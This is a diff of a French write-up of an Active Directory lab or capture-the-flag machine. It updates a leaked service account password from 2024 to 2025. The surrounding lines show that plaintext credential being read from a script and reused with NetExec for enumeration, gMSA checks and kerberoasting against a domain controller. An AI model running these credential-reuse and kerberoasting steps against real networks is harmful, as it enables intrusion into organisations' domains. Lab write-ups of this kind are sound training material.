@@ -24,7 +24,7 @@ Bien qu’il n’y est rien dans le fichier `scores.txt` il y à tout de même d
 ```
 hermes@OlympeWordpress:/$ cat /srv/pantheon.god/scores/scores.txt
 hermes@OlympeWordpress:/$ cat /opt/scores/score_update.sh
-smbclient //192.168.56.11/scores -U 'smbscores%Sc0r3sS3rv1c3!2024' -c 'put /srv/pantheon.god/scores/scores.txt scores.txt'
+smbclient //192.168.56.11/scores -U 'smbscores%Sc0r3sS3rv1c3!2025' -c 'put /srv/pantheon.god/scores/scores.txt scores.txt'
 hermes@OlympeWordpress:/$
 ```
 
@@ -131,10 +131,10 @@ Ainsi on oublie pas rajouter les information du domaine dans /etc/hosts et /etc/
 ```
 [smbscores@pantheon.god][Jun 22, 2025 - 23:48:03 (CEST)] exegol-pantheon_wu writeup # nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-hosts /etc/hosts
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
-SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
 [smbscores@pantheon.god][Jun 22, 2025 - 23:48:07 (CEST)] exegol-pantheon_wu writeup # nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-krb5 /etc/krb5.conf
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
-SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
 ```
 
 On peut tenter des attaque classique de l’active directory tel que l’`asreprosting` ou  `kerberoasting` qui justement nécessite des identifiant valide pour être exécuter.
@@ -145,7 +145,7 @@ D’ailleurs on peut voir que `svc_thunderB$` est un `gmsa` que seul les utilisa
 ```
 nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --gmsa
 LDAP        192.168.56.11   389    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:Enforced) (channel binding:When Supported)
-LDAP        192.168.56.11   389    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
+LDAP        192.168.56.11   389    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
 LDAP        192.168.56.11   389    PANTHEON-DC01    [*] Getting GMSA Passwords
 LDAP        192.168.56.11   389    PANTHEON-DC01    Account: svc_thunderB$        NTLM: <no read permissions>       PrincipalsAllowedToReadPassword: OLYMPE-SERVICES-MANAGERS
 ```
@@ -159,7 +159,7 @@ LDAP        192.168.56.11   389    PANTHEON-DC01    Account: svc_thunderB$      
     ```
     [smbscores@pantheon.god][Jun 22, 2025 - 23:40:10 (CEST)] exegol-pantheon_wu writeup # nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoast Kerberoastables.txt --port 636
     LDAPS       192.168.56.11   636    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 (name:PANTHEON-DC01) (domain:pantheon.god)
-    LDAPS       192.168.56.11   636    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
+    LDAPS       192.168.56.11   636    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
     LDAPS       192.168.56.11   636    PANTHEON-DC01    Bypassing disabled account krbtgt
     LDAPS       192.168.56.11   636    PANTHEON-DC01    [*] Total of records returned 16
     LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: svc_thunderB$ memberOf:  pwdLastSet: 2025-06-21 21:33:28.483382 lastLogon:<never>
